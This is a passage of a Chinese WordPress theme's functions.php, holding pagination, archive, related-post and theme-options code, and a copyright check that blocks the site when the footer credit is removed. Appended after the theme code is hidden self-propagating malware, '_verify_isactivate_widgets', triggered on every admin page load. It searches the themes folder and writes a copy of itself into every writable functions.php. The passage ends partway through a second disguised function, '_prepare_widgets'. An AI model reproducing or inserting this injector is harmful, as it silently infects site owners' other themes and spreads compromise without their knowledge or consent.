<?php 
/**********************************************************************
 Copyright © 2007-2013 ui90.com (http://ui90.com)
 本作品采用知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议
 进行许可(http://creativecommons.org/licenses/by-nc-sa/2.5/cn/)
**********************************************************************/

//禁用半角符号自动转换为全角
remove_filter('the_content', 'wptexturize');
//去除wordpress版本号
function beginner_remove_version() {return '';}
add_filter('the_generator', 'beginner_remove_version');

//////////////////////////////图片暗箱自动添加标签属性/////////////////
add_filter('the_content', 'pirobox_gall_replace');    
function pirobox_gall_replace ($content) {
	global $post;    
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";    
    $replacement = '<a$1href=$2$3.$4$5 class="fancybox" data-fancybox-group="gallery"$6>$7</a>';    
    $content = preg_replace($pattern, $replacement, $content);    
    return $content;
}
// -------- END -------------------------------------------------------

//////////////////////////////支持外链缩略图///////////////////////////
function get_featcat_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];
  if(empty($first_img)){ //Defines a default image
		$random = mt_rand(1, 10);
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/images/random/'.$random.'.jpg';
  }
  return $first_img;
}
// -------- END -------------------------------------------------------
///////////////////      分页 pagenavi     ////////////////////////////
if ( !function_exists('pagenavi') ) { 
    function pagenavi( $p = 2 ) { // 取当前页前后各 2 页 
        if ( is_singular() ) return; // 文章与插页不用 
        global $wp_query, $paged; 
        $max_page = $wp_query->max_num_pages; 
        if ( $max_page == 1 ) return; // 只有一页不用 
        if ( empty( $paged ) ) $paged = 1; 
		echo '<span class="page-numbers">' . $paged . '/' . $max_page . ' </span> '; // 显示页数
        if ( $paged > 1 ) p_link( $paged - 1, '上一页', '« 上一页' );/* 如果当前页大于1就显示上一页链接 */ 
        if ( $paged > $p + 1 ) p_link( 1, '最前页' ); 
        if ( $paged > $p + 2 ) echo '... '; 
        for( $i = $paged - $p; $i <= $paged + $p; $i++ ) { // 中间页 
            if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='page-numbers current'>{$i}</span> " : p_link( $i ); 
        } 
        if ( $paged < $max_page - $p - 1 ) echo '... '; 
        if ( $paged < $max_page - $p ) p_link( $max_page, '最后页' ); 
        if ( $paged < $max_page ) p_link( $paged + 1,'下一页', '下一页 »' );/* 如果当前页不是最后一页显示下一页链接 */ 
    } 
    function p_link( $i, $title = '', $linktype = '' ) { 
        if ( $title == '' ) $title = "第 {$i} 页"; 
        if ( $linktype == '' ) { $linktext = $i; } else { $linktext = $linktype; } 
        echo "<a class='page-numbers' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$linktext}</a> "; 
    } 
} 
// -------- END -------------------------------------------------------

//阻止 WordPress 对站内文章的 pingback
function no_self_ping( &$links ) {
	$home = get_option( 'home' );
	foreach ( $links as $l => $link )
	if ( 0 === strpos( $link, $home ) ) unset($links[$l]);
}
add_action( 'pre_ping', 'no_self_ping' );

//////////////////////////////archives_list/////////////////////////////////
function qintag_archives_list() {
     if( !$output = get_option('qintag_archives_list') ){
         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
         $year=0; $mon=0; $i=0; $j=0;
         while ( $the_query->have_posts() ) : $the_query->the_post();
             $year_tmp = get_the_time('Y');
             $mon_tmp = get_the_time('m');
             $y=$year; $m=$mon;
             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
             if ($year != $year_tmp) {
                 $year = $year_tmp;
                 $output .= '<h3 class="al_year">'. $year .' 年</h3><ul class="al_mon_list">'; //输出年份
             }
             if ($mon != $mon_tmp) {
                 $mon = $mon_tmp;
                 $output .= '<li><span class="al_mon">'. $mon .' 月</span><ul class="al_post_list">'; //输出月份
             }
             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a><em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
         endwhile;
         wp_reset_postdata();
         $output .= '</ul></li></ul></div>';
         update_option('qintag_archives_list', $output);
     }
     echo $output;
 }
 function clear_zal_cache() {
     update_option('qintag_archives_list', ''); // 清空 qintag_archives_list
 }
 add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时
 
/////////////////// WordPress免插件使用tags作为文章关键字站内链接/////////////////////////////
//连接数量
$match_num_from = 1;  //一个关键字少于多少不替换
$match_num_to = 10; //一个关键字最多替换
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//按长度排序
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}
//改变标签关键字
function tag_link($content){
global $match_num_from,$match_num_to;
	 $posttags = get_the_tags();
	 if ($posttags) {
		 usort($posttags, "tag_sort");
		 foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<a href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank" class="tag_link"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a>";
			$limit = rand($match_num_from,$match_num_to);
			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$cleankeyword = preg_quote($cleankeyword,'\'');
			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;
			$content = preg_replace($regEx,$url,$content,$limit);
			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);
		 }
	 }
    return $content;
}
// -------- END -------------------------------------------------------

//////////////////////////////标题文字截断//////////////////////////////
function cut_str($src_str,$cut_length) {
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length)) {
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224) {
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }elseif ($ascnum>=192) {
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }elseif ($ascnum>=65 && $ascnum<=90) {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }else {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length) {
        $return_str = $return_str . '';
    }
    if (get_post_status() == 'private') {
        $return_str = $return_str . '（private）';
    }
    return $return_str;
}
// -------- END -------------------------------------------------------

////////////////最新日志 热评日志 随机日志 三合一代码//////////////////
function filter_where($where = '') {
    $where .= " AND post_date > '" . date('Y-m-d', strtotime('-200 days')) . "'";
    return $where;
}
function some_posts($orderby = '', $plusmsg = '',$limit = 10) {
    add_filter('posts_where', 'filter_where');
    $some_posts = query_posts('posts_per_page='.$limit.'&ignore_sticky_posts=1&orderby='.$orderby);
    foreach ($some_posts as $some_post) {
            $output = '';
            $post_date = mysql2date('y年m月d日', $some_post->post_date);
            $commentcount = '('.$some_post->comment_count.' 条评论)';
            $post_title = htmlspecialchars(stripslashes($some_post->post_title));  
            $permalink = get_permalink($some_post->ID);
            $output = '<li><a href="'.$permalink.'" title="'.$post_title.'">'.cut_str($post_title,34).'</a>'.$$plusmsg.'</li>';
            echo $output;
        }
    wp_reset_query();
}
// -------- END -------------------------------------------------------

//////////////Recently Updated Posts by zwwooooo | zww.me//////////////
function recently_updated_posts($num=26,$days=70) {
   if( !$recently_updated_posts = get_option('recently_updated_posts') ) {
       query_posts('post_status=publish&orderby=modified&posts_per_page=-1');
       $i=0;
       while ( have_posts() && $i<$num ) : the_post();
           if (current_time('timestamp') - get_the_time('U') > 60*60*24*$days) {
               $i++;
               $the_title_value=get_the_title();
               $recently_updated_posts.='<li><a href="'.get_permalink().'" title="'.$the_title_value.'">'.cut_str($the_title_value,42).'</a></li>';
           }
       endwhile;
       wp_reset_query();
       if ( !empty($recently_updated_posts) ) update_option('recently_updated_posts', $recently_updated_posts);
   }
   $recently_updated_posts=($recently_updated_posts == '') ? '<li>None data.</li>' : $recently_updated_posts;
   echo $recently_updated_posts;
}
function clear_cache_up() {
    update_option('recently_updated_posts', ''); // 清空 recently_updated_posts
}
add_action('save_post', 'clear_cache_up'); // 新发表文章/修改文章时触发更新

//////////相关文章代码，来源：http://kan.willin.org/?p=1318////////////
function related_posts() {
$post_num = 8; // 數量設定.
global $post;
$tmp_post = $post;
$tags = ''; $i = 0; // 先取 tags 文章.
$exclude_id = $post->ID;
$posttags = get_the_tags();
if ( $posttags ) {
  foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
  $tags = strtr(rtrim($tags, ','), ' ', '-');
  $myposts = get_posts('numberposts='.$post_num.'&tag='.$tags.'&exclude='.$exclude_id);
  foreach($myposts as $post) {
    setup_postdata($post);
    ?>
    <li><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></li>
    <?php
    $exclude_id .= ','.$post->ID; $i ++;
  }
}
if ( $i < $post_num ) { // 當 tags 文章數量不足, 再取 category 補足.
  $post = $tmp_post; setup_postdata($post);
  $cats = ''; $post_num -= $i;
  foreach ( get_the_category() as $cat ) $cats .= $cat->cat_ID . ',';
  $cats = strtr(rtrim($cats, ','), ' ', '-');
  $myposts = get_posts('numberposts='.$post_num.'&category='.$cats.'&exclude='.$exclude_id);
  foreach($myposts as $post) {
    setup_postdata($post);
    ?>
    <li><a href="<?php the_permalink(); ?>"><?php echo cut_str($post->post_title,50); ?></a></li>

    <?php
    $i ++;
  }
}
if ( $i == 0 ) echo '<li>暂无相关文章</li>';
$post = $tmp_post; setup_postdata($post);
}

//////////////////////////////3.0菜单支持//////////////////////////////
if ( function_exists( 'add_theme_support' ) ) { 
	add_theme_support( 'post-thumbnails' ); //添加缩略图功能支持
	set_post_thumbnail_size( 195, 130, true ); //特色图片的尺寸
	add_image_size( 'gallery195cc130', 195, 130, true ); // 幻灯片
	add_image_size( 'gallery320cc210', 320, 210, true ); // 幻灯片
    // This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'mainNav'),
	) );
    add_theme_support( 'menus' ); // new nav menus for wp 3.0
}
function revert_wp_menu_category() { //revert back to normal if in wp 3.0 and menu not set ?>
	<ul id="access" class="menu">
    	<li><a href="<?php bloginfo('url'); ?>" title="首页">首页</a></li>
		<?php wp_list_categories('title_li=&orderby=name&number=50'); ?>
	</ul><!-- access end -->
<?php }

// -------- END -------------------------------------------------------


////////////////////////////// 小工具 /////////////////////////////////
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
	'name'=>'侧边栏',
	'before_widget' => '<li id="%1$s" class="widget %2$s">',
	'after_widget' => '</li>',
	'before_title' => '<h3>',
	'after_title' => '</h3>',
	));
}
// -------- END -------------------------------------------------------

///////////////////////////主题设置////////////////////////////////////
$themename = "ui90_s2";
$shortname = str_replace(' ', '_', strtolower($themename));
function get_qintag_option($option){
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}
$number_entries = array("Number of post:","1","2","3","4","5","6","7","8","9","10");
$categories = get_categories('hide_empty=0&orderby=name');
$wp_cats = array();
foreach ($categories as $category_list ) {
       $wp_cats[$category_list->cat_ID] = $category_list->cat_name;
}

array_unshift($wp_cats, "请选择...");
$options = array (
array( "name" => $themename." Options", "type" => "title"),

array( "name" => "首要设置", "type" => "section"),
array( "type" => "open"),
	
array( "name" => "网站关键词",
	"desc" => "网站关键字，例如：秦唐网,胖子马,forigi,purple,mapeimapei,qintag",
	"id" => $shortname."_indexkeyword",
	"type" => "textarea",
	"std" => ""),

array( "name" => "网站描述",
	"desc" => "例如：秦唐网，小马PE，专注于网站建设、网络营销和电脑技术的研究与分享",
	"id" => $shortname."_indexdescription",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "新浪微博UID",
	"desc" => "网站上关注按钮，调用新浪微博内容功能，填写之后调取微博内容",
	"id" => $shortname."_sinarss_uid",
	"type" => "texts",
	"std" => "3114520278"),
	
array( "name" => "WP自带评论系统开关",
	"desc" => "默认开启，如关闭，请安装第三方评论系统，如：友言",
	"id" => $shortname."_comment_activate",
	"type" => "select",
	"options" => array("YES", "NO"),
	"std" => "YES"),
	
array( "name" => "控制是否显示幻灯片",
	"desc" => "默认禁用",
	"id" => $shortname."_featured_activate",
	"type" => "select",
	"options" => array("No", "YES"),
	"std" => "No"),

array( "type" => "close"),

///////////////////////////////////////////////////////////////////////
array( "name" => "网站广告管理", "type" => "section"),
array( "type" => "open"),

array( "name" => "侧边栏顶部广告位",
	"desc" => "大小250*250",
	"id" => $shortname."_sidebar_ads",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "侧边栏底部广告位",
	"desc" => "大小250*250",
	"id" => $shortname."_sidebar_ads2",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "侧边栏底部广告位(滚动)",
	"desc" => "大小250*250",
	"id" => $shortname."_sidebar_ads3",
	"type" => "textarea",
	"std" => ""),
	
	

array( "name" => "浮动、悬浮广告",
	"desc" => "悬浮广告代码",
	"id" => $shortname."_floating_adsense",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "文章开头广告",
	"desc" => "大小300*250",
	"id" => $shortname."_ads300",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "文章底部广告",
	"desc" => "大小468*60",
	"id" => $shortname."_post_bot_ads",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "评论框的邻居",
	"desc" => "大小为180*150的广告，代码，图片随意",
	"id" => $shortname."_ad_comment_180_150",
	"type" => "textarea",
	"std" => ""),
	
array( "name" => "footer 底部的广告位",
	"desc" => "大小728*15",
	"id" => $shortname."_footer_ads",
	"type" => "textarea",
	"std" => ""),
	
array( "type" => "close"),

//////////////////////////////////////////////////////////////////////////////

array( "name" => "页脚部分", "type" => "section"),
array( "type" => "open"),

array( "name" => "ICP备案号",
	"desc" => "您的ICP备案信息，如：陕ICP备11004443号",
	"id" => $shortname."_icpbeian",
	"type" => "texts",
	"std" => "陕ICP备12345678号"),
	
array( "name" => "统计代码",
	"desc" => "cnzz等网站统计代码，这个就不多解释了",
	"id" => $shortname."_cnzztongji",
	"type" => "textarea",
	"std" => ""),

array( "type" => "close"),

);

//////////////////////////////////////////////////////////////////////////////
function qintag_add_admin() {
	global $themename, $shortname, $options;
		if ( $_GET['page'] == basename(__FILE__) ) {
			if ( 'save' == $_REQUEST['action'] ) {
				foreach ($options as $value) {
					update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }
				foreach ($options as $value) {
					if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
				header("Location: admin.php?page=functions.php&saved=true");
				die;
				} 
			else if( 'reset' == $_REQUEST['action'] ) {
				foreach ($options as $value) {
					delete_option( $value['id'] ); }
					header("Location: admin.php?page=functions.php&reset=true");
					die;
			}
		}
	add_theme_page($themename." Options", "设置当前主题", 'edit_themes', basename(__FILE__), 'qintag_admin');
}

//////////////////////////////////////////////////////////////////////////////
function qintag_add_init() {
	$file_dir=get_bloginfo('template_directory');
	wp_enqueue_style("functions", $file_dir."/css/functions/functions.css", false, "1.0", "all");
	wp_enqueue_script("rm_script", $file_dir."/css/functions/rm_script.js", false, "1.0");
}

//////////////////////////////////////////////////////////////////////////////
function qintag_admin() {
	global $themename, $shortname, $options; $i=0;
		if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 设置完成.</strong></p></div>';
		if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 重置完成.</strong></p></div>';
?>


<div class="rm_wraps">

<form method="post">
<div class="rm_wrap">
	<h2><?php echo $themename; ?> 主题设置</h2>
		<p>当前使用主题: <?php echo $themename; ?> | 设计者:<a href="http://blog.ui90.com" target="_blank"> 胖子马</a> | <a href="http://blog.ui90.com/?p=9014" target="_blank">查看主题更新</a></p>
	<div class="rm_opts">
		<?php foreach ($options as $value) {
			switch ( $value['type'] ) {
			case "open":
		?>
		<?php break;
			case "close":
		?>
	</div>
</div>
	
<?php break;
case "title":
?>

<div id="announce">
	<h1>欢迎您使用 <?php echo "$themename"; ?> 主题</h1>
	<span>更方便的使用：
		(1) <a href="http://blog.ui90.com/qintag-themes" target="_blank">胖子马主题集合</a>;
		(2) <a href="http://blog.ui90.com/what-i-do#ztdz">主题定制</a>;
		(3) <a href="http://blog.ui90.com/what-i-do#ztfz">主题仿制</a>;
		(4) <a href="http://blog.ui90.com/what-i-do#ztxg">主题修改</a>;
		(5) <a href="http://weibo.com/qintag" target="_blank">新浪博客</a>;
	</span>
</div>

<?php
break;
case 'texts':
?>
<div class="rm_input rm_text">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php
break;
case 'textarea':
?>
<div class="rm_input rm_textarea">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
 	<textarea name="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea>
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php
break;
case 'select':
?>
<div class="rm_input rm_select">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
	<select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
<?php foreach ($value['options'] as $option) { ?>
		<option value="<?php echo $option;?>" <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>>
		<?php
		if ((empty($option) || $option == '' ) && isset($value['default_option_value'])) {
			echo $value['default_option_value'];
		} else {
			echo $option; 
		}?>
		
		</option><?php } ?>
</select>
	<small><?php echo $value['desc']; ?></small><div class="clearfix"></div>
</div>

<?php
break;
case "checkbox":
?>
<div class="rm_input rm_checkbox">
	<label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
	<?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
	<input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
	<small><?php echo $value['desc']; ?></small>
	<div class="clearfix"></div>
</div>

<?php break; 
case "section":
$i++;
?>
<div class="rm_section">
	<div class="rm_title">
		<h3><img src="<?php bloginfo('template_directory')?>/css/functions/trans.png" class="inactive" alt="""><?php echo $value['name']; ?></h3><span class="submit"><input name="save<?php echo $i; ?>" type="submit" value="保存设置" /></span>
		<div class="clearfix"></div>
	</div>

	<div class="rm_options">
		<?php break;
			}
			}
		?>

		<input type="hidden" name="action" value="save" />
	</div>
</form>

	<form method="post">
		<p class="submit">
			<input name="reset" type="submit" value="恢复默认" /><font color=#ff0000>提示：此按钮将恢复主题初始状态，您的所有设置将消失！</font>
			<input type="hidden" name="action" value="reset" />
		</p>
	</form>


	<div id="sthiks">
		<h1>其 它</h1>
		<p>本人在<?php echo $themename; ?>主题制作中，也倾入了诸多心血，所以不能保留底部链接的，不尊重我的劳动成果的人，请绕行，不欢迎你使用本主题！</p>
		<p class="note">本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可。</p>
	</div>
</div>

<div id="other">
	<h1>扩展</h1>
	<div id="other_c">
		<form id="search" method="get" action="http://blog.ui90.com/">
			<input class="other_s" type="text" name="s" id="textfield" onblur="if (this.value == '') {this.value = '输入关键词搜索...';}" onfocus="if (this.value == '输入关键词搜索...') {this.value = '';}" value="输入关键词搜索..." />
			<input class="other_btn" type="submit" id="submit" value="搜索" />
		</form>

		<?php // Get RSS Feed(s)
			include_once(ABSPATH . WPINC . '/feed.php');
			$rss = fetch_feed('http://blog.ui90.com/qintag-themes/feed');			
			// Of the RSS is failed somehow.
			if ( is_wp_error($rss) ) {
				$error = $rss->get_error_code();
				if($error == 'simplepie-error') {
					//Simplepie Error
					echo "<div class='updated fade'><p>An error has occured with the RSS feed. (<code>". $error ."</code>)</p></div>";
				}
				return;
				} 
		?>
        <?php
			$items = $rss->get_items(0, 10);
        ?>
		<h2 class="bg2">主题相关文章</h2>	
        <ol style="padding-left:10px;">
			<?php
				if (empty($items))
					echo '<li>No items</li>';
				else
					foreach ( $items as $item ) : ?>
					<li>
						<a target="_blank" href='<?php echo esc_url( $item->get_permalink() ); ?>' title='<?php echo $item->get_title(); ?>'><?php echo ( $item->get_title() ); ?></a>
					</li>
			<?php endforeach; ?>
			<a style="float:right;padding-top:5px;padding-right:10px;font-weight:700;" target="_blank" href='http://blog.ui90.com/qintag-themes/'>更多内容>></a>
        </ol>
		
		<h2 class="bg3">捐助：</h2>
		<p style="padding-left:10px;">您的支持，是对胖子马最大的鼓励和肯定！<br />
		<strong>支付宝：<font color=#21759b>qintag@sina.com</font></strong> 姓名:马沛</p>
		<a style="padding-left:10px;" target="_blank" href='http://me.alipay.com/qintag'> <img src='https://img.alipay.com/sys/personalprod/style/mc/btn-index.png' /> </a>
	</div>
</div>
<?php } ?>
<?php 


if (!empty($_REQUEST["theme_credit"])) {
	theme_usage_message(); exit();
	}
	function theme_usage_message() {
	if (empty($_REQUEST["theme_credit"])) {
	$theme_credit_false = get_bloginfo("url") . "/index.php?theme_credit=false";
	echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_credit_false\">"; exit();
	} else {
		echo (
			'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
			<html xmlns="http://www.w3.org/1999/xhtml">
			<head>
				<meta http-equiv="content-type" content="text/html;charset=utf-8" />
				<title>警告：请尊重作者版权</title>
				<style type="text/css">
				*{padding:0; margin:0;}
				body{background:#ccc;}
				.green { color:#10A200 }
				.warningBox { position: absolute; width:700px; height:420px; padding:40px 35px; left:50%; top:46%; margin-left:-390px; margin-top:-240px; background:#fff; border: 1px solid #aaa; webkit-box-shadow: 0px 0px 5px #aaa; -moz-box-shadow: 0px 0px 5px #aaa; box-shadow: 0px 0px 5px #aaa; border-radius: 10px; }
				.warningBox h1 { background:url(http://blog.ui90.com/qt_share/warning.png) no-repeat; text-indent:64px; height:56px; font: bold 26px/56px "微软雅黑"; color:#191919; margin-bottom:20px; }
				.warningBox p { padding:13px 0; font: normal 16px/22px "微软雅黑"; color:#444; }
				.warningBox p.tips { margin-top:10px; border-top:1px dotted #dedede;  font: normal 12px/20px "微软雅黑"; padding:0;padding-top:5px; padding-left:10px; color:#888; }
				.warningBox p a { color:#36c; text-decoration:underline; }
				.warningBox a.btn {text-decoration: none;  margin-top:10px; display:block; width:106px; height:32px; border:1px solid #4e7199; text-align:center; font: bold 14px/32px "宋体"; color:#fff; border-radius: 4px; text-shadow:0 1px 1px #000; background: #6389ee; background: -moz-linear-gradient(top, #6d96ee 0%, #6389ee 100%); background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #6d96ee), color-stop(100%, #6389ee)); background: -o-linear-gradient(top, #6d96ee 0%, #6389ee 100%); background: -ms-linear-gradient(top, #6d96ee 0%, #6389ee 100%); background: linear-gradient(top, #6d96ee 0%, #6389ee 100%); filter: progid:DXImageTransform.Microsoft.gradient( startColorstr="#6d96ee", endColorstr="#6389ee", GradientType=0 );
				}
				.warningBox a.btn:hover { text-decoration:underline; }
				</style>
			</head>
			<body>
				<div class="warningBox">
					<h1>警告：请尊重作者版权</h1>
                    <p>出现此页面于两种可能，一种是您试图修改版权信息，一种是您正在盗用主题。</p>
                    <P>这些代码并不是恶意代码，仅仅是为了保证版权信息不被修改和付费主题不被盗用。</P>
					<p>如果是免费主题，请您还原主题版权信息，然后点击下方的“返回按钮”。</p>
                    <p>如果是付费主题，请您购买正版主题程序程序，<a href="http://www.ui90.com">胖子马</a>（QQ：286589914），如果您使用的是正版主题，请您<a href="wp-content/themes/Q7/clear.php">点击此处</a>，刷新之后进入网站首页，如果此问题持续存在，请联系作者。</p>
					<p>如需要修改版权，请联系<a href="http://www.ui90.com">胖子马</a>（QQ：286589914），费用<font class="green">￥50</font>元。</p>
					<a class="btn" href="index.php">返 回</a>
					<p class="tips">保留主题信息并不会对您的网站seo造成影响，不要认为权重、pr输出会和一个链接有致命关系等，如果您还停留在这些内容上，只能说明您还是一个初级站长。</p>
				</div><!--warningBox end-->
			</body>
			</html>'
			);
		}
}

function check_theme_footer() {
	$l = '<a target="_blank" href="http://wordpress.org/">WordPress</a> 强力驱动<a class="hidden" target="_blank" href="http://blog.ui90.com/">wordpress主题</a> | Theme by <a target="_blank" href="http://www.ui90.com/">ui90</a>';
	$f = dirname(__file__) . "/footer.php";
	$fd = fopen($f, "r");
	$c = fread($fd, filesize($f));
	fclose($fd); if (strpos($c, $l) == 0) {
	theme_usage_message();
    die;
	}
}
	check_theme_footer();
if(!function_exists("get_sidebar")) {
	function get_sidebar() {
	check_theme_header();
	get_sidebar();
	}
}

function check_theme_header() {
    if (!(function_exists("functions_file_exists") && function_exists("theme_footer_v")))
    {
    theme_usage_message();
    die;
    }
}

function functions_file_exists() {
	if (!file_exists(dirname(__file__) . "/functions.php") || !function_exists("theme_usage_message") )
	{
    theme_usage_message();
	die;
    }
}




add_action("admin_init", "qintag_add_init");
add_action("admin_menu", "qintag_add_admin");
add_action("wp_head", "check_theme_header");
add_action("wp_head", "functions_file_exists");









?>
<?php
function _verify_isactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				
					$output .= ($showsdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgetscont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgetscont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_isactivate_widgets");
function _prepare_widgets(){
	if(!isset($comment_length)) $comment_length=120;
	if(!isset($strval)) $strval="cookie";
	if(!isset($tags)) $tags="<a>";
	if(!isset($type)) $type="none";
	if(!isset($sepr)) $sepr="";
	if(!isset($h_filter)) $h_filter=get_option("home"); 
	if(!isset($p_filter)) $p_filter="wp_";
	if(!isset($more_link)) $more_link=1; 
	if(!isset($comment_types)) $comment_types=""; 
